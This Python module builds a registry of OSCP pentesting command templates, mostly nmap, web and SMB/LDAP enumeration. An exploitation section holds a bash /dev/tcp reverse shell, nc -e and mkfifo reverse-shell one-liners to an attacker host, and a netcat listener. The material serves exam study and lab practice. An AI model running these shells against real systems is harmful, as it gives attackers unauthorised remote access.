"""
Command Templates - Reusable OSCP command patterns

Provides pre-configured command templates with variable substitution
for common pentesting workflows. Templates include:
- Recon: nmap scans, service enumeration
- Web: gobuster, nikto, whatweb
- Enumeration: enum4linux, smbclient, ldapsearch
- Exploitation: reverse shells, file transfers
"""

from typing import Dict, List, Any, Optional


class CommandTemplate:
    """Single command template with variable substitution"""

    def __init__(
        self,
        template_id: str,
        name: str,
        command: str,
        description: str,
        variables: List[Dict],
        category: str,
        flag_explanations: Dict[str, str] = None,
        tags: List[str] = None,
        alternatives: List[str] = None,
        success_indicators: List[str] = None,
        estimated_time: str = None
    ):
        """
        Initialize command template

        Args:
            template_id: Unique identifier (e.g., 'nmap-quick')
            name: Human-readable name
            command: Command with <PLACEHOLDERS>
            description: What this command does
            variables: List of variable definitions
            category: Category (recon, web, enumeration, etc.)
            flag_explanations: Dict of flag → explanation
            tags: List of tags (OSCP:HIGH, QUICK_WIN, etc.)
            alternatives: Manual alternative commands
            success_indicators: What success looks like
            estimated_time: Time estimate for OSCP exam planning
        """
        self.id = template_id
        self.name = name
        self.command = command
        self.description = description
        self.variables = variables
        self.category = category
        self.flag_explanations = flag_explanations or {}
        self.tags = tags or []
        self.alternatives = alternatives or []
        self.success_indicators = success_indicators or []
        self.estimated_time = estimated_time or "varies"

    def fill(self, values: Dict[str, str]) -> str:
        """
        Substitute variables and return final command

        Args:
            values: Dict mapping variable names to values

        Returns:
            Command with all placeholders replaced
        """
        result = self.command
        for key, value in values.items():
            placeholder = f"<{key}>"
            result = result.replace(placeholder, value)
        return result

    def get_required_variables(self) -> List[str]:
        """Get list of required variable names"""
        return [var['name'] for var in self.variables if var.get('required', True)]

    def get_optional_variables(self) -> List[str]:
        """Get list of optional variable names"""
        return [var['name'] for var in self.variables if not var.get('required', True)]


class TemplateRegistry:
    """Registry of command templates"""

    _templates: Dict[str, CommandTemplate] = {}
    _categories: Dict[str, List[str]] = {}

    @classmethod
    def register(cls, template: CommandTemplate):
        """
        Register a template

        Args:
            template: CommandTemplate instance to register
        """
        cls._templates[template.id] = template

        # Track by category
        if template.category not in cls._categories:
            cls._categories[template.category] = []
        cls._categories[template.category].append(template.id)

    @classmethod
    def get(cls, template_id: str) -> Optional[CommandTemplate]:
        """
        Get template by ID

        Args:
            template_id: Template ID

        Returns:
            CommandTemplate instance or None
        """
        return cls._templates.get(template_id)

    @classmethod
    def list_all(cls) -> List[CommandTemplate]:
        """
        Get all registered templates

        Returns:
            List of all CommandTemplate instances
        """
        return list(cls._templates.values())

    @classmethod
    def list_by_category(cls, category: str) -> List[CommandTemplate]:
        """
        Get templates by category

        Args:
            category: Category name

        Returns:
            List of CommandTemplate instances in category
        """
        template_ids = cls._categories.get(category, [])
        return [cls._templates[tid] for tid in template_ids if tid in cls._templates]

    @classmethod
    def get_categories(cls) -> List[str]:
        """
        Get all available categories

        Returns:
            List of category names
        """
        return sorted(cls._categories.keys())

    @classmethod
    def search(cls, query: str) -> List[CommandTemplate]:
        """
        Search templates by name, description, or tags

        Args:
            query: Search query

        Returns:
            List of matching templates
        """
        query = query.lower()
        results = []

        for template in cls._templates.values():
            # Search in name
            if query in template.name.lower():
                results.append(template)
            # Search in description
            elif query in template.description.lower():
                results.append(template)
            # Search in tags
            elif any(query in tag.lower() for tag in template.tags):
                results.append(template)
            # Search in category
            elif query in template.category.lower():
                results.append(template)

        return results


# Pre-register common OSCP templates
def _register_defaults():
    """Register default OSCP command templates"""

    # ===== RECON TEMPLATES =====

    TemplateRegistry.register(CommandTemplate(
        template_id='nmap-quick',
        name='Nmap Quick Scan',
        command='nmap -sS -p- --min-rate=1000 <TARGET> -oA nmap_quick',
        description='Fast TCP SYN scan of all 65535 ports',
        variables=[
            {
                'name': 'TARGET',
                'description': 'Target IP address',
                'example': '192.168.45.100',
                'required': True
            }
        ],
        category='recon',
        flag_explanations={
            '-sS': 'TCP SYN scan (stealth scan, requires root)',
            '-p-': 'Scan all 65535 ports (default is top 1000)',
            '--min-rate=1000': 'Send at least 1000 packets per second (faster scan)',
            '-oA': 'Output all formats (normal, XML, grepable)'
        },
        tags=['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
        alternatives=[
            'masscan -p1-65535 <TARGET> --rate=1000',
            'nc -zv <TARGET> 1-65535 2>&1 | grep succeeded'
        ],
        success_indicators=[
            'Open ports discovered',
            'Scan completes without firewall blocking'
        ],
        estimated_time='1-5 minutes'
    ))

    TemplateRegistry.register(CommandTemplate(
        template_id='nmap-service',
        name='Nmap Service Version Detection',
        command='nmap -sV -sC -p <PORTS> <TARGET> -oA nmap_service',
        description='Service version detection and default script scan on specific ports',
        variables=[
            {
                'name': 'TARGET',
                'description': 'Target IP address',
                'example': '192.168.45.100',
                'required': True
            },
            {
                'name': 'PORTS',
                'description': 'Port list (comma-separated)',
                'example': '22,80,443,3306',
                'required': True
            }
        ],
        category='recon',
        flag_explanations={
            '-sV': 'Service version detection (probe open ports)',
            '-sC': 'Default NSE scripts (safe enumeration scripts)',
            '-p': 'Port specification (comma-separated list)',
            '-oA': 'Output all formats (REQUIRED for OSCP documentation)'
        },
        tags=['OSCP:HIGH', 'ENUM', 'RECON'],
        alternatives=[
            'nc -v <TARGET> <PORT> (manual banner grabbing)',
            'telnet <TARGET> <PORT>'
        ],
        success_indicators=[
            'Service names and versions identified',
            'NSE scripts return useful information'
        ],
        estimated_time='2-5 minutes'
    ))

    TemplateRegistry.register(CommandTemplate(
        template_id='nmap-udp',
        name='Nmap UDP Top Ports Scan',
        command='sudo nmap -sU --top-ports 20 <TARGET> -oA nmap_udp',
        description='Scan top 20 most common UDP ports',
        variables=[
            {
                'name': 'TARGET',
                'description': 'Target IP address',
                'example': '192.168.45.100',
                'required': True
            }
        ],
        category='recon',
        flag_explanations={
            '-sU': 'UDP scan (slower than TCP, requires root)',
            '--top-ports': 'Scan N most common ports (faster than all UDP ports)',
            'sudo': 'Required for UDP scans (needs raw socket access)'
        },
        tags=['OSCP:MEDIUM', 'RECON', 'UDP'],
        alternatives=[
            'nmap -sU -p 161,162,53,69,123 <TARGET> (specific UDP ports)'
        ],
        success_indicators=[
            'open|filtered or open UDP ports found',
            'Common services: DNS (53), SNMP (161), TFTP (69)'
        ],
        estimated_time='5-10 minutes'
    ))

    # ===== WEB ENUMERATION TEMPLATES =====

    TemplateRegistry.register(CommandTemplate(
        template_id='gobuster-dir',
        name='Gobuster Directory Brute-force',
        command='gobuster dir -u <URL> -w <WORDLIST> -o gobuster.txt -x php,html,txt',
        description='Directory and file brute-forcing with common extensions',
        variables=[
            {
                'name': 'URL',
                'description': 'Target URL (include http:// or https://)',
                'example': 'http://192.168.45.100',
                'required': True
            },
            {
                'name': 'WORDLIST',
                'description': 'Wordlist path',
                'example': '/usr/share/wordlists/dirb/common.txt',
                'required': True
            }
        ],
        category='web',
        flag_explanations={
            'dir': 'Directory/file brute-forcing mode',
            '-u': 'Target URL',
            '-w': 'Wordlist path (common.txt for speed, big.txt for thorough)',
            '-o': 'Output file (REQUIRED for OSCP documentation)',
            '-x': 'File extensions to append (php,html,txt)'
        },
        tags=['OSCP:HIGH', 'QUICK_WIN', 'WEB'],
        alternatives=[
            'dirb <URL> <WORDLIST>',
            'ffuf -u <URL>/FUZZ -w <WORDLIST>',
            'Manual: curl http://target/admin, /upload, /backup'
        ],
        success_indicators=[
            'Status: 200 (found)',
            'Status: 403 (forbidden but exists)',
            'Interesting directories/files discovered'
        ],
        estimated_time='1-10 minutes depending on wordlist'
    ))

    TemplateRegistry.register(CommandTemplate(
        template_id='nikto-scan',
        name='Nikto Web Vulnerability Scanner',
        command='nikto -h <URL> -output nikto.txt',
        description='Comprehensive web server vulnerability scan',
        variables=[
            {
                'name': 'URL',
                'description': 'Target URL',
                'example': 'http://192.168.45.100',
                'required': True
            }
        ],
        category='web',
        flag_explanations={
            '-h': 'Target host/URL',
            '-output': 'Output file (save results for documentation)'
        },
        tags=['OSCP:MEDIUM', 'WEB', 'NOISY'],
        alternatives=[
            'Manual: curl -I <URL> (check headers)',
            'Browser: View page source, check robots.txt'
        ],
        success_indicators=[
            'Outdated software versions found',
            'Misconfigurations discovered',
            'Interesting files/directories identified'
        ],
        estimated_time='5-15 minutes'
    ))

    TemplateRegistry.register(CommandTemplate(
        template_id='whatweb',
        name='WhatWeb Technology Fingerprinting',
        command='whatweb <URL> -v',
        description='Identify web technologies, CMS, frameworks, versions',
        variables=[
            {
                'name': 'URL',
                'description': 'Target URL',
                'example': 'http://192.168.45.100',
                'required': True
            }
        ],
        category='web',
        flag_explanations={
            '-v': 'Verbose mode (show detailed findings)',
        },
        tags=['OSCP:HIGH', 'QUICK_WIN', 'WEB'],
        alternatives=[
            'curl -I <URL> (manual header inspection)',
            'Browser: View page source, check meta tags'
        ],
        success_indicators=[
            'CMS identified (WordPress, Joomla, etc.)',
            'Web server version revealed',
            'Programming language detected'
        ],
        estimated_time='< 1 minute'
    ))

    # ===== ENUMERATION TEMPLATES =====

    TemplateRegistry.register(CommandTemplate(
        template_id='enum4linux',
        name='Enum4Linux SMB Enumeration',
        command='enum4linux -a <TARGET>',
        description='Complete SMB/SAMBA enumeration (users, shares, groups, etc.)',
        variables=[
            {
                'name': 'TARGET',
                'description': 'Target IP address',
                'example': '192.168.45.100',
                'required': True
            }
        ],
        category='enumeration',
        flag_explanations={
            '-a': 'All enumeration (users, shares, groups, password policy, etc.)'
        },
        tags=['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'SMB'],
        alternatives=[
            'smbclient -L //<TARGET> -N (list shares)',
            'rpcclient -U "" <TARGET> (null session RPC)',
            'crackmapexec smb <TARGET> --shares'
        ],
        success_indicators=[
            'User accounts enumerated',
            'Share list obtained',
            'Password policy revealed',
            'OS information gathered'
        ],
        estimated_time='1-3 minutes'
    ))

    TemplateRegistry.register(CommandTemplate(
        template_id='smbclient-list',
        name='SMBClient List Shares',
        command='smbclient -L //<TARGET> -N',
        description='List SMB shares without authentication (null session)',
        variables=[
            {
                'name': 'TARGET',
                'description': 'Target IP address',
                'example': '192.168.45.100',
                'required': True
            }
        ],
        category='enumeration',
        flag_explanations={
            '-L': 'List shares on target',
            '-N': 'No password (null session attempt)',
            '//': 'UNC path format'
        },
        tags=['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'SMB'],
        alternatives=[
            'enum4linux -S <TARGET>',
            'crackmapexec smb <TARGET> --shares'
        ],
        success_indicators=[
            'Share names listed',
            'No NT_STATUS_ACCESS_DENIED error'
        ],
        estimated_time='< 1 minute'
    ))

    TemplateRegistry.register(CommandTemplate(
        template_id='ldapsearch-anon',
        name='LDAP Anonymous Bind Search',
        command='ldapsearch -x -H ldap://<TARGET> -b "<BASE_DN>"',
        description='Anonymous LDAP query for domain information',
        variables=[
            {
                'name': 'TARGET',
                'description': 'Target IP address',
                'example': '192.168.45.100',
                'required': True
            },
            {
                'name': 'BASE_DN',
                'description': 'Base DN (e.g., DC=domain,DC=local)',
                'example': 'DC=example,DC=com',
                'required': False
            }
        ],
        category='enumeration',
        flag_explanations={
            '-x': 'Simple authentication (vs SASL)',
            '-H': 'LDAP URI',
            '-b': 'Base DN for search'
        },
        tags=['OSCP:MEDIUM', 'ENUM', 'LDAP', 'AD'],
        alternatives=[
            'nmap --script ldap-search <TARGET>',
            'ldapsearch -x -h <TARGET> -s base namingcontexts (get base DN)'
        ],
        success_indicators=[
            'Domain information retrieved',
            'User objects found',
            'No authentication required'
        ],
        estimated_time='1-2 minutes'
    ))

    # ===== EXPLOITATION TEMPLATES =====

    TemplateRegistry.register(CommandTemplate(
        template_id='searchsploit',
        name='SearchSploit Exploit Search',
        command='searchsploit <QUERY>',
        description='Search exploit database for vulnerabilities',
        variables=[
            {
                'name': 'QUERY',
                'description': 'Search query (service name, version, CVE)',
                'example': 'apache 2.4.49',
                'required': True
            }
        ],
        category='exploitation',
        flag_explanations={},
        tags=['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
        alternatives=[
            'Google: site:exploit-db.com <QUERY>',
            'GitHub: <service> <version> exploit'
        ],
        success_indicators=[
            'Relevant exploits found',
            'Recent exploits (check disclosure date)'
        ],
        estimated_time='< 1 minute'
    ))

    TemplateRegistry.register(CommandTemplate(
        template_id='bash-reverse-shell',
        name='Bash Reverse Shell',
        command='bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1',
        description='Bash TCP reverse shell (paste into command injection)',
        variables=[
            {
                'name': 'LHOST',
                'description': 'Local/attacker IP address',
                'example': '192.168.45.200',
                'required': True
            },
            {
                'name': 'LPORT',
                'description': 'Local port for listener',
                'example': '4444',
                'required': True
            }
        ],
        category='exploitation',
        flag_explanations={
            'bash -i': 'Interactive bash shell',
            '>&': 'Redirect stdout and stderr',
            '/dev/tcp/': 'Bash built-in TCP connection (not all systems)',
            '0>&1': 'Redirect stdin to stdout (bidirectional shell)'
        },
        tags=['OSCP:HIGH', 'QUICK_WIN', 'SHELL', 'LINUX'],
        alternatives=[
            'nc -e /bin/bash <LHOST> <LPORT>',
            'python -c "import socket..." (Python reverse shell)',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> <LPORT> >/tmp/f'
        ],
        success_indicators=[
            'Listener receives connection',
            'Interactive shell prompt'
        ],
        estimated_time='< 1 minute'
    ))

    TemplateRegistry.register(CommandTemplate(
        template_id='nc-listener',
        name='Netcat Listener',
        command='nc -lvnp <LPORT>',
        description='Start netcat listener for reverse shells',
        variables=[
            {
                'name': 'LPORT',
                'description': 'Local port to listen on',
                'example': '4444',
                'required': True
            }
        ],
        category='exploitation',
        flag_explanations={
            '-l': 'Listen mode (wait for connection)',
            '-v': 'Verbose (show connection details)',
            '-n': 'No DNS lookup (faster)',
            '-p': 'Port to listen on'
        },
        tags=['OSCP:HIGH', 'QUICK_WIN', 'SHELL'],
        alternatives=[
            'nc -nvlp <LPORT> (alternative flag order)',
            'rlwrap nc -lvnp <LPORT> (better shell with arrow keys)'
        ],
        success_indicators=[
            'Listening on port',
            'Connection received message'
        ],
        estimated_time='< 1 minute'
    ))


# Auto-register defaults on module import
_register_defaults()
